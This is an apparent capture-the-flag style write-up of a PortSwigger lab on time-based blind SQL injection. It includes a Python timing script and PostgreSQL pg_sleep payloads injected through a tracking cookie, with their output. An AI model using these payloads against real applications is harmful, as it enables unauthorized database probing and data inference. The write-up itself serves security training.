# Blind SQL injection with time delays

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays), you'll learn: Blind SQL injection with time delays! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to cause a 10 second delay.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-14/images/Pasted%20image%2020221209022117.png)

**Tracking cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-14/images/Pasted%20image%2020221209022147.png)

**In the previous labs, we found that there is a blind SQL injection vulnerability in the tracking cookie.**

**For the sake of automation, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

def main():
	url = 'https://0a940002030b0daec0a4e9a00011002f.web-security-academy.net/'

	payload = """PAYLOAD_HERE"""
	finalPayload = urllib.parse.quote(payload)

	cookie = {
		'session': 'YOUR_SESSIONID',
		'TrackingId': finalPayload
	}

	startTime = time()
	requests.get(url, cookies=cookie)
	endTime = time()
	finalTime = endTime - startTime

	if finalTime >= 10:
		print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
	else:
		print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')

if __name__ == '__main__':
	main()
```

**To trigger a Time-Based SQL injection, we use the following payloads:** (From [PortSwigger's SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet))

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-14/images/Pasted%20image%2020221209023003.png)

**After some fumbling around, I found PostgreSQL time delay payload works:**
```py
# Payload 1:
payload = """';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--"""

# Payload 2:
payload = """';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--"""
```

```
# Payload 1:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
└─# python3 exploit.py
[+] Payload triggered, slept for 11.27s

# Payload 2:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-14]
└─# python3 exploit.py
[-] Payload didn't trigger, slept for 0.92s
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-14/images/Pasted%20image%2020221209023126.png)

# What we've learned:

1. Blind SQL injection with time delays